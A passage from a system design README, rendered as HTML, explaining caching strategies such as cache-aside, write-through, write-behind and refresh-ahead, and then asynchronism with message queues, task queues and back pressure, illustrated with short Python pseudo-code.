&lt;h4&gt;&lt;a id="user-content-cache-aside" class="anchor" aria-hidden="true" href="#cache-aside"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cache-aside&lt;/h4&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/7f5934e49a678b67f65e5ed53134bc258b007ebb/687474703a2f2f692e696d6775722e636f6d2f4f4e6a4f52716b2e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/7f5934e49a678b67f65e5ed53134bc258b007ebb/687474703a2f2f692e696d6775722e636f6d2f4f4e6a4f52716b2e706e67" data-canonical-src="http://i.imgur.com/ONjORqk.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://www.slideshare.net/tmatyashovsky/from-cache-to-in-memory-data-grid-introduction-to-hazelcast" rel="nofollow"&gt;Source: From cache to in-memory data grid&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;The application is responsible for reading and writing from storage.  The cache does not interact with storage directly.  The application does the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Look for entry in cache, resulting in a cache miss&lt;/li&gt;
&lt;li&gt;Load entry from the database&lt;/li&gt;
&lt;li&gt;Add entry to cache&lt;/li&gt;
&lt;li&gt;Return entry&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-python"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;def&lt;/span&gt; &lt;span class="pl-en"&gt;get_user&lt;/span&gt;(&lt;span class="pl-smi"&gt;&lt;span class="pl-smi"&gt;self&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-smi"&gt;user_id&lt;/span&gt;):
    user &lt;span class="pl-k"&gt;=&lt;/span&gt; cache.get(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;user.&lt;span class="pl-c1"&gt;{0}&lt;/span&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, user_id)
    &lt;span class="pl-k"&gt;if&lt;/span&gt; user &lt;span class="pl-k"&gt;is&lt;/span&gt; &lt;span class="pl-c1"&gt;None&lt;/span&gt;:
        user &lt;span class="pl-k"&gt;=&lt;/span&gt; db.query(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;SELECT * FROM users WHERE user_id = &lt;span class="pl-c1"&gt;{0}&lt;/span&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, user_id)
        &lt;span class="pl-k"&gt;if&lt;/span&gt; user &lt;span class="pl-k"&gt;is&lt;/span&gt; &lt;span class="pl-k"&gt;not&lt;/span&gt; &lt;span class="pl-c1"&gt;None&lt;/span&gt;:
            key &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;user.&lt;span class="pl-c1"&gt;{0}&lt;/span&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;.format(user_id)
            cache.set(key, json.dumps(user))
    &lt;span class="pl-k"&gt;return&lt;/span&gt; user&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href="https://memcached.org/" rel="nofollow"&gt;Memcached&lt;/a&gt; is generally used in this manner.&lt;/p&gt;
&lt;p&gt;Subsequent reads of data added to cache are fast.  Cache-aside is also referred to as lazy loading.  Only requested data is cached, which avoids filling up the cache with data that isn't requested.&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-disadvantages-cache-aside" class="anchor" aria-hidden="true" href="#disadvantages-cache-aside"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): cache-aside&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Each cache miss results in three trips, which can cause a noticeable delay.&lt;/li&gt;
&lt;li&gt;Data can become stale if it is updated in the database.  This issue is mitigated by setting a time-to-live (TTL) which forces an update of the cache entry, or by using write-through.&lt;/li&gt;
&lt;li&gt;When a node fails, it is replaced by a new, empty node, increasing latency.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-write-through" class="anchor" aria-hidden="true" href="#write-through"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Write-through&lt;/h4&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/56b870f4d199335ccdbc98b989ef6511ed14f0e2/687474703a2f2f692e696d6775722e636f6d2f3076426330684e2e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/56b870f4d199335ccdbc98b989ef6511ed14f0e2/687474703a2f2f692e696d6775722e636f6d2f3076426330684e2e706e67" data-canonical-src="http://i.imgur.com/0vBc0hN.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://www.slideshare.net/jboner/scalability-availability-stability-patterns/" rel="nofollow"&gt;Source: Scalability, availability, stability, patterns&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;The application uses the cache as the main data store, reading and writing data to it, while the cache is responsible for reading and writing to the database:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Application adds/updates entry in cache&lt;/li&gt;
&lt;li&gt;Cache synchronously writes entry to data store&lt;/li&gt;
&lt;li&gt;Return&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Application code:&lt;/p&gt;
&lt;div class="highlight highlight-source-python"&gt;&lt;pre&gt;set_user(&lt;span class="pl-c1"&gt;12345&lt;/span&gt;, {&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;foo&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;:&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;bar&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;})&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Cache code:&lt;/p&gt;
&lt;div class="highlight highlight-source-python"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;def&lt;/span&gt; &lt;span class="pl-en"&gt;set_user&lt;/span&gt;(&lt;span class="pl-smi"&gt;user_id&lt;/span&gt;, &lt;span class="pl-smi"&gt;values&lt;/span&gt;):
    user &lt;span class="pl-k"&gt;=&lt;/span&gt; db.query(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;UPDATE Users WHERE id = &lt;span class="pl-c1"&gt;{0}&lt;/span&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, user_id, values)
    cache.set(user_id, user)&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Write-through is a slow overall operation due to the write operation, but subsequent reads of just written data are fast.  Users are generally more tolerant of latency when updating data than reading data.  Data in the cache is not stale.&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-disadvantages-write-through" class="anchor" aria-hidden="true" href="#disadvantages-write-through"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): write through&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;When a new node is created due to failure or scaling, the new node will not cache entries until the entry is updated in the database.  Cache-aside in conjunction with write through can mitigate this issue.&lt;/li&gt;
&lt;li&gt;Most data written might never be read, which can be minimized with a TTL.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-write-behind-write-back" class="anchor" aria-hidden="true" href="#write-behind-write-back"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Write-behind (write-back)&lt;/h4&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/8aa9f1a2f050c1422898bb5e82f1f01773334e22/687474703a2f2f692e696d6775722e636f6d2f72675372766a472e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/8aa9f1a2f050c1422898bb5e82f1f01773334e22/687474703a2f2f692e696d6775722e636f6d2f72675372766a472e706e67" data-canonical-src="http://i.imgur.com/rgSrvjG.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://www.slideshare.net/jboner/scalability-availability-stability-patterns/" rel="nofollow"&gt;Source: Scalability, availability, stability, patterns&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;In write-behind, the application does the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Add/update entry in cache&lt;/li&gt;
&lt;li&gt;Asynchronously write entry to the data store, improving write performance&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a id="user-content-disadvantages-write-behind" class="anchor" aria-hidden="true" href="#disadvantages-write-behind"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): write-behind&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;There could be data loss if the cache goes down prior to its contents hitting the data store.&lt;/li&gt;
&lt;li&gt;It is more complex to implement write-behind than it is to implement cache-aside or write-through.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-refresh-ahead" class="anchor" aria-hidden="true" href="#refresh-ahead"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Refresh-ahead&lt;/h4&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/49dcb54307763b4f56d61a4a1369826e2e7d52e4/687474703a2f2f692e696d6775722e636f6d2f6b78746a7167452e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/49dcb54307763b4f56d61a4a1369826e2e7d52e4/687474703a2f2f692e696d6775722e636f6d2f6b78746a7167452e706e67" data-canonical-src="http://i.imgur.com/kxtjqgE.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://www.slideshare.net/tmatyashovsky/from-cache-to-in-memory-data-grid-introduction-to-hazelcast" rel="nofollow"&gt;Source: From cache to in-memory data grid&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;You can configure the cache to automatically refresh any recently accessed cache entry prior to its expiration.&lt;/p&gt;
&lt;p&gt;Refresh-ahead can result in reduced latency vs read-through if the cache can accurately predict which items are likely to be needed in the future.&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-disadvantages-refresh-ahead" class="anchor" aria-hidden="true" href="#disadvantages-refresh-ahead"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): refresh-ahead&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Not accurately predicting which items are likely to be needed in the future can result in reduced performance than without refresh-ahead.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-disadvantages-cache" class="anchor" aria-hidden="true" href="#disadvantages-cache"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): cache&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Need to maintain consistency between caches and the source of truth such as the database through &lt;a href="https://en.wikipedia.org/wiki/Cache_algorithms" rel="nofollow"&gt;cache invalidation&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Cache invalidation is a difficult problem, there is additional complexity associated with when to update the cache.&lt;/li&gt;
&lt;li&gt;Need to make application changes such as adding Redis or memcached.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading-10" class="anchor" aria-hidden="true" href="#sources-and-further-reading-10"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/tmatyashovsky/from-cache-to-in-memory-data-grid-introduction-to-hazelcast" rel="nofollow"&gt;From cache to in-memory data grid&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://horicky.blogspot.com/2010/10/scalable-system-design-patterns.html" rel="nofollow"&gt;Scalable system design patterns&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lethain.com/introduction-to-architecting-systems-for-scale/" rel="nofollow"&gt;Introduction to architecting systems for scale&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/jboner/scalability-availability-stability-patterns/" rel="nofollow"&gt;Scalability, availability, stability, patterns&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.lecloud.net/post/9246290032/scalability-for-dummies-part-3-cache" rel="nofollow"&gt;Scalability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.aws.amazon.com/AmazonElastiCache/latest/UserGuide/Strategies.html" rel="nofollow"&gt;AWS ElastiCache strategies&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Cache_(computing)" rel="nofollow"&gt;Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-asynchronism" class="anchor" aria-hidden="true" href="#asynchronism"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Asynchronism&lt;/h2&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/c01ec137453216bbc188e3a8f16da39ec9131234/687474703a2f2f692e696d6775722e636f6d2f353447597353782e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/c01ec137453216bbc188e3a8f16da39ec9131234/687474703a2f2f692e696d6775722e636f6d2f353447597353782e706e67" data-canonical-src="http://i.imgur.com/54GYsSx.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://lethain.com/introduction-to-architecting-systems-for-scale/#platform_layer" rel="nofollow"&gt;Source: Intro to architecting systems for scale&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;Asynchronous workflows help reduce request times for expensive operations that would otherwise be performed in-line.  They can also help by doing time-consuming work in advance, such as periodic aggregation of data.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-message-queues" class="anchor" aria-hidden="true" href="#message-queues"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Message queues&lt;/h3&gt;
&lt;p&gt;Message queues receive, hold, and deliver messages.  If an operation is too slow to perform inline, you can use a message queue with the following workflow:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;An application publishes a job to the queue, then notifies the user of job status&lt;/li&gt;
&lt;li&gt;A worker picks up the job from the queue, processes it, then signals the job is complete&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The user is not blocked and the job is processed in the background.  During this time, the client might optionally do a small amount of processing to make it seem like the task has completed.  For example, if posting a tweet, the tweet could be instantly posted to your timeline, but it could take some time before your tweet is actually delivered to all of your followers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href="https://redis.io/" rel="nofollow"&gt;Redis&lt;/a&gt;&lt;/strong&gt; is useful as a simple message broker but messages can be lost.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href="https://www.rabbitmq.com/" rel="nofollow"&gt;RabbitMQ&lt;/a&gt;&lt;/strong&gt; is popular but requires you to adapt to the 'AMQP' protocol and manage your own nodes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href="https://aws.amazon.com/sqs/" rel="nofollow"&gt;Amazon SQS&lt;/a&gt;&lt;/strong&gt; is hosted but can have high latency and has the possibility of messages being delivered twice.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-task-queues" class="anchor" aria-hidden="true" href="#task-queues"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Task queues&lt;/h3&gt;
&lt;p&gt;Tasks queues receive tasks and their related data, runs them, then delivers their results.  They can support scheduling and can be used to run computationally-intensive jobs in the background.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Celery&lt;/strong&gt; has support for scheduling and primarily has python support.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-back-pressure" class="anchor" aria-hidden="true" href="#back-pressure"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Back pressure&lt;/h3&gt;
&lt;p&gt;If queues start to grow significantly, the queue size can become larger than memory, resulting in cache misses, disk reads, and even slower performance.  &lt;a href="http://mechanical-sympathy.blogspot.com/2012/05/apply-back-pressure-when-overloaded.html" rel="nofollow"&gt;Back pressure&lt;/a&gt; can help by limiting the queue size, thereby maintaining a high throughput rate and good response times for jobs already in the queue.  Once the queue fills up, clients get a server busy or HTTP 503 status code to try again later.  Clients can retry the request at a later time, perhaps with &lt;a href="https://en.wikipedia.org/wiki/Exponential_backoff" rel="nofollow"&gt;exponential backoff&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-disadvantages-asynchronism" class="anchor" aria-hidden="true" href="#disadvantages-asynchronism"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): asynchronism&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Use cases such as inexpensive calculations and realtime workflows might be better suited for synchronous operations, as introducing queues can add delays and complexity.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading-11" class="anchor" aria-hidden="true" href="#sources-and-further-reading-11"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=1KRYH75wgy4" rel="nofollow"&gt;It's all a numbers game&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mechanical-sympathy.blogspot.com/2012/05/apply-back-pressure-when-overloaded.html" rel="nofollow"&gt;Applying back pressure when overloaded&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Little%27s_law" rel="nofollow"&gt;Little's law&lt;/a&gt;&lt;/li&gt;
